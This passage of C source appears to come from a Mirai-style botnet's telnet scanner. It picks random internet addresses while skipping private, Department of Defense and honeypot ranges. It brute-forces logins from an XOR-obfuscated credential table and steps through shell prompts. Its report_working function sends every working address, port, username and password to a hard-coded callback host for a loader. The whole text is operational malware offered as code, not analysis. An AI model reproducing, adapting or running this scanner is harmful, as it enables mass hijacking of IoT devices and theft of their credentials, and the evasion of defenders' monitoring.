                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
			case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SHELL);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SHELL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SH);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SH);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                table_unlock_val(TABLE_SCAN_QUERY);
                                tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_QUERY);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
                                if (++(conn->tries) == 10)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
		  (o1 == 106 && o2 == 186) ||               // 106.186.0.0/16   - honeypot
		  (o1 == 106 && o2 == 187) ||               // 106.187.0.0/16   - honeypot
		  (o1 == 106 && o2 == 185) ||               // 106.187.0.0/16   - honeypot
		  (o1 == 106 && o2 == 184) ||               // 106.187.0.0/16   - honeypot
		  (o1 == 150 && o2 == 31) ||                // 150.31.0.0/16    - honeypot
		  (o1 == 49 && o2 == 51) ||                 // 49.51.0.0/16     - honeypot
		  (o1 == 178 && o2 == 62) ||                // 178.62.0.0/16    - honeypot
		  (o1 == 160 && o2 == 13) ||                // 160.13.0.0/16    - honeypot
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp, len;
		char *Josho_ogin;
		char *Josho_enter;
        table_unlock_val(TABLE_SCAN_OGIN);
		table_unlock_val(TABLE_SCAN_ENTER);
		Josho_ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
		Josho_enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, Josho_ogin, len - 1) != -1))
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, Josho_enter, len - 1) != -1))
            prompt_ending = tmp;
    }
        table_lock_val(TABLE_SCAN_OGIN);
		table_lock_val(TABLE_SCAN_ENTER);
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

        if (prompt_ending == -1)
    {
		char *Josho_asswd;
        int tmp, len;
		table_unlock_val(TABLE_SCAN_ASSWORD);
		Josho_asswd = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, Josho_asswd, len - 1) != -1))
            prompt_ending = tmp;
    }
		table_lock_val(TABLE_SCAN_ASSWORD);
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_NCORRECT);
    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
    {
        table_lock_val(TABLE_SCAN_NCORRECT);
        return -1;
    }
    table_lock_val(TABLE_SCAN_NCORRECT);

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(TABLE_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    #ifdef USEDOMAIN
    struct resolv_entries *entries = NULL;
    #endif

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }
    
    #ifdef USEDOMAIN
    entries = resolv_lookup(SCANDOM);
    if (entries == NULL)
    {
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = SCANIP;
        addr.sin_port = htons(SCANPORT);
        return;
    } else {
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
        addr.sin_port = htons(SCANPORT);
    }

    resolv_entries_free(entries);
    #else
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = SCANIP;
    addr.sin_port = htons(SCANPORT);
    #endif


    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xFB;
        cpy[i] ^= 0xAF;
    }

    return cpy;
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}

